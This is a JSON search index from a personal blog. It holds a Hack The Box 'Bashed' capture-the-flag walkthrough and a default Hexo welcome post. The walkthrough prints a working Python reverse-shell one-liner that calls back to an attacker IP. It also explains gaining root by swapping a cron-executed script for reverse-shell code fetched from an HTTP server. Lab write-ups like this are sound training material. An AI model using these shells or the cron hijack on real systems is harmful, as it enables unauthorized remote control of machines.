[{"id":"e2770a9e378da55d2b296a958a5f336a","title":"blog#1","content":"BASHEDIntroduction:\nOn Tuesday, October 10th, the night air felt unusually brisk. While this detail might seem unrelated, it sets the stage for our journey. Let’s delve into the core of the matter without further ado.\nSo, lets Enumerate the Ip\nEnumeration:\nThe first rule of hacking, akin to starting a vehicle with a key, is to enumerate the target. Here, we begin by enumerating the IP address:\n\n\n\nAll I found in that IP address is a normal website lets just brute force it with our super directory brute forcing tool Gobuster(you can even use  dirbuster depends on the choice of you)\nwhen it started to list out the directories , it came across few intresting \n\nwell &#x2F;dev seems intrestingnavigating to &#x2F;dev and then phpbashwe got answer for question 2\n\nExploitation:\nUpon accessing the website, I encountered the user interface with the username\nwww-data\n, which serves as the answer for question 3:\n\nI need to generate a reverse shell and setup a netcat listener \nI found the following reverse shell code and used my tun0 ip(if you don’t have tun0 ip use eth0 ip)\n12python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.3&quot;,8686)); //Change IP and Port os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;\n\nI’m gonna use 8686 so start a netcat listener with same port\nAfter successful execution of reverse shell I got the following in my listener\n\nNote in order to make the reverse shell listener interactive run the following code in listenerpython -c ‘import pty; pty.spawn(”&#x2F;bin&#x2F;bash”);’\nAs the question pointed out the flag is in user arrexel folder which is in home directory\n\n\nWell First part is done on to privilege escalation\nrun the command sudo -l  to see what command can www-get can run without requiring password or permissions from root user\n\nAs the picture depicts it is  scriptmanager\nTo switch to user scriptmanagerrun this command                                                    sudo -u scriptmanager &#x2F;bin&#x2F;bashThe explanation for the flags aresudo: This is the command used to allow a permitted user to execute a command as the superuser                \n-u scriptmanager: This option tells sudo to run the subsequent command (/bin/bash in this case) as the user specified after -u, which is scriptmanager in this case.\n/bin/bash: This is the command that will be executed with superuser privileges. In this example, it’s invoking the Bash shell.\n\nThere is an interesting directory which access only  for user scriptmanager\n\nThe answer for question 5 is cd &#x2F;scripts\n\nGoing on\n\nI checked the folder and its files\nThere is a simple script in ‘test.py’ which writes output on file ‘test.txt’. One more interesting thing we got is that creation time of file test.txt is keep updating to the latest time. This mean there is a cron job or something like background process is running which runs test.py script automatically. If we replace the test.py file with our test.py file containing reverse shell code and check might we can get reverse shell of root user or not.\nIn order to do that create a HTTP Server using python from the directory where we have saved our reverse shell code.\nsince the test.py is being executed by cron job i can use the same reverse shell code at the start of this machine\nbefore that i need to setup a python web server to download that reverse shell into listner shell\n\nthe command ispython3 -m http.server 8000\n\nAfter setting up server download the file to reverse shell listener \n\nAfter successful download start another netcat listener to capture root shell\nSince our reverse shell program saved as test.py.1 , we need to change it as original file name ,\n                                           **rm test.py and mv test.py.1**\n\nSo , for reverse shell listener I have used 4422 port number and wait for few minutes , and let the cronjob do its job .\nAfter a couple of minutes , you can see your listener founds a shell\nTip: if the the shell didn’t pick anything in 2 mins try running the program once to check for syntaxes \n\nThere you go enjoy the Root flag\n\nConclusion:\nIn conclusion, the Bashed machine on Hack The Box presented a series of challenges that required meticulous enumeration, exploitation, and privilege escalation. By following these steps, I successfully navigated through the obstacles and obtained the root flag.\n","slug":"blog-1","date":"2024-05-24T12:47:20.000Z","categories_index":"","tags_index":"","author_index":"dkvv_varma"},{"id":"b9663f58f18133b35bfe243f3e916a80","title":"Hello World","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post1$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server1$ hexo server\n\nMore info: Server\nGenerate static files1$ hexo generate\n\nMore info: Generating\nDeploy to remote sites1$ hexo deploy\n\nMore info: Deployment\n","slug":"hello-world","date":"2024-05-24T11:55:51.615Z","categories_index":"","tags_index":"","author_index":"dkvv_varma"}]